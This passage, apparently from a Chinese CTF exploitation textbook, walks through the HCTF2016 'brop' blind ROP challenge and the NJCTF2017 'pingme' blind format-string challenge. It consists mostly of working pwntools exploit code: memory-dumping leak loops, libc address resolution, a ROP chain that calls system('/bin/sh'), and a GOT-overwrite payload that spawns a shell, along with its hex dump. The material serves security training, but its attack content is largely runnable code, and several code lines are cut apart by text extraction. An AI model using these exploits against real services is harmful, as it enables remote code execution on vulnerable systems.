6.1.1 pwn HCTF2016 brop
except:
log.info("Can't connect")
addr -= 1
def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, sta
rt_addr, end_addr):
pop_rdi = gadgets_addr + 9 # pop rdi; ret
result = ""
while start_addr  %s" % (start_addr,(data
or '').encode('hex')))
result += data
start_addr += len(data)
p.close()
except:
log.info("Can't connect")
return result
def get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, p
uts_got):
pop_rdi = gadgets_addr + 9
891
6.1.1 pwn HCTF2016 brop
payload = "A"*buf_size
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(stop_addr)
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
data = p.recvline()
data = u64(data[:-1] + '\x00\x00')
log.info("puts address: 0x%x" % data)
p.close()
return data
#buf_size = get_buffer_size()
buf_size = 72
#stop_addr = get_stop_addr(buf_size)
stop_addr = 0x4005e5
#gadgets_addr = get_gadgets_addr(buf_size, stop_addr)
gadgets_addr = 0x40082a
#puts_plt = get_puts_plt(buf_size, stop_addr, gadgets_addr)
puts_plt = 0x4005e7 # fake puts
#puts_plt = 0x4005f0 # true puts
# dump code section from memory
# and then use Radare2 or IDA Pro to find the got address
#start_addr = 0x400000
#end_addr = 0x401000
#code_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_
plt, start_addr, end_addr)
#with open('code.bin', 'wb') as f:
# f.write(code_bin)
# f.close()
puts_got = 0x00601018
892
6.1.1 pwn HCTF2016 brop
# you can also dump data from memory and get information from .g
ot
#start_addr = 0x600000
#end_addr = 0x602000
#data_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_
plt, start_addr, end_addr)
#with open('data.bin', 'wb') as f:
# f.write(data_bin)
# f.close()
# must close ASLR
#puts_addr = get_puts_addr(buf_size, stop_addr, gadgets_addr, pu
ts_plt, puts_got)
puts_addr = 0x7ffff7a90210
# first add your own libc into libc-database: $ ./add /usr/lib/l
ibc-2.26.so
# $ ./find puts 0x7ffff7a90210
# or $ ./find puts 210
# $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570
# $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts
# then you can get the following offset
offset_puts = 0x000000000006f210
offset_system = 0x0000000000042010
offset_str_bin_sh = 0x17aff5
system_addr = (puts_addr - offset_puts) + offset_system
binsh_addr = (puts_addr - offset_puts) + offset_str_bin_sh
# get shell
payload = "A"*buf_size
payload += p64(gadgets_addr + 9) # pop rdi; ret;
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(stop_addr)
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
p.interactive()
893
6.1.1 pwn HCTF2016 brop
参考资料
Blind Return Oriented Programming (BROP)
Blind Return Oriented Programming (BROP) Attack (1)
894
6.1.2 pwn NJCTF2017 pingme
6.1.2 pwn NJCTF2017 pingme
题目复现
Blind fmt 原理及题目解析
漏洞利用
参考资料
下载文件
题目复现
在 6.1.1 中我们看到了 blind ROP，这一节中则将看到 blind fmt。它们的共同点是
都没有二进制文件，只提供 ip 和端口。
checksec 如下：
$ checksec -f pingme
RELRO STACK CANARY NX PIE
RPATH RUNPATHFORTIFY Fortified Fortifiable FILE
No RELRO No canary found NX enabled No PIE
No RPATH No RUNPATH No 0 2 pingme
关闭 ASLR，然后把程序运行起来：
$ socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &
Blind fmt 原理及题目解析
格式化字符串漏洞我们已经在 3.3.1 中详细讲过了，blind fmt 要求我们在没有二进
制文件和 libc.so 的情况下进行漏洞利用，好在程序没有开启任何保护，利用很直
接。
通常有两种方法可以解决这种问题，一种是利用信息泄露把程序从内存中 dump 下
来，另一种是使用 pwntools 的 DynELF 模块（关于该模块的使用我们在章节 4.4
中有讲过）。
895
6.1.2 pwn NJCTF2017 pingme
漏洞利用
确认漏洞
首先你当然不知道这是一个栈溢出还是格式化字符串，栈溢出的话输入一段长字符
串，但程序是否崩溃，格式化字符串的话就输入格式字符，看输出。
$ nc 127.0.0.1 10001
Ping me
ABCD%7$x
ABCD44434241
很明显是格式字符串，而且 ABCD 在第 7 个参数的位置，实际上当然不会这么
巧，所以需要使用一个脚本去枚举。这里使用 pwntools 的 fmtstr 模块了：
def exec_fmt(payload):
p.sendline(payload)
info = p.recv()
return info
auto = FmtStr(exec_fmt)
offset = auto.offset
[*] Found format string offset: 7
dump file
接下来我们就利用该漏洞把二进制文件从内存中 dump 下来：
896
6.1.2 pwn NJCTF2017 pingme
def dump_memory(start_addr, end_addr):
result = ""
while start_addr  %s" % (start_addr, data.enco
de('hex')))
result += data
start_addr += len(data)
p.close()
return result
start_addr = 0x8048000
end_addr = 0x8049000
code_bin = dump_memory(start_addr, end_addr)
with open("code.bin", "wb") as f:
f.write(code_bin)
f.close()
这里构造的 paylaod 和前面有点不同，它把地址放在了后面，是为了防止 printf 的
%s 被 \x00 截断：
payload = "%9$s.AAA" + p32(start_addr)
另外 .AAA ，是作为一个标志，我们需要的内存在 .AAA 的前面，最后，偏移由
7 变为 9。
在没有开启 PIE 的情况下，32 位程序从地址 0x8048000 开始，0x1000 的大小
就足够了。在对内存 \x00 进行 leak 时，数据长度为零，直接给它赋值就可以
了。
于是就成了有二进制文件无 libc 的格式化字符串漏洞，在 r2 中查询 printf 的 got 地
址：
897
6.1.2 pwn NJCTF2017 pingme
[0x08048490]> is~printf
vaddr=0x08048400 paddr=0x00000400 ord=002 fwd=NONE sz=16 bind=GL
OBAL type=FUNC name=imp.printf
[0x08048490]> pd 3 @ 0x08048400
: ;-- imp.printf:
: 0x08048400 ff2574990408 jmp dword [reloc.prin
tf_116] ; 0x8049974
: 0x08048406 6808000000 push 8
; 8
`= %s" % (addr, data.encode('hex'))
)
p.close()
return data
data = DynELF(leak, 0x08048490) # Entry point address
system_addr = data.lookup('system', 'libc')
printf_addr = data.lookup('printf', 'libc')
log.info("system address: 0x%x" % system_addr)
log.info("printf address: 0x%x" % printf_addr)
[*] system address: 0xf7df9c50
[*] printf address: 0xf7e0e670
899
6.1.2 pwn NJCTF2017 pingme
DynELF 不要求我们拿到 libc.so，所以如果我们查询不到 libc.so 的版本信息，该模
块就能发挥它最大的作用。
attack
按照格式化字符串漏洞的套路，我们通过任意写将 printf@got 指向的内存覆盖为
system 的地址，然后发送字符串 /bin/sh ，就可以在调用
printf("/bin/sh") 的时候实际上调用 system("/bin/sh") 。
终极 payload 如下，使用 fmtstr_payload 函数来自动构造，将：
payload = fmtstr_payload(7, {printf_got: system_addr})
p = remote('127.0.0.1', '10001')
p.recvline()
p.sendline(payload)
p.recv()
p.sendline('/bin/sh')
p.interactive()
虽说有这样的自动化函数很方便，基本的手工构造还是要懂的，看一下生成的
payload 长什么样子：
[DEBUG] Sent 0x3a bytes:
00000000 74 99 04 08 75 99 04 08 76 99 04 08 77 99 04 08
│t···│u···│v···│w···│
00000010 25 36 34 63 25 37 24 68 68 6e 25 37 36 63 25 38
│%64c│%7$h│hn%7│6c%8│
00000020 24 68 68 6e 25 36 37 63 25 39 24 68 68 6e 25 32
│$hhn│%67c│%9$h│hn%2│
00000030 34 63 25 31 30 24 68 68 6e 0a
│4c%1│0$hh│n·│
0000003a
开头是 printf@got 地址，四个字节分别位于：
900
6.1.2 pwn NJCTF2017 pingme
0x08049974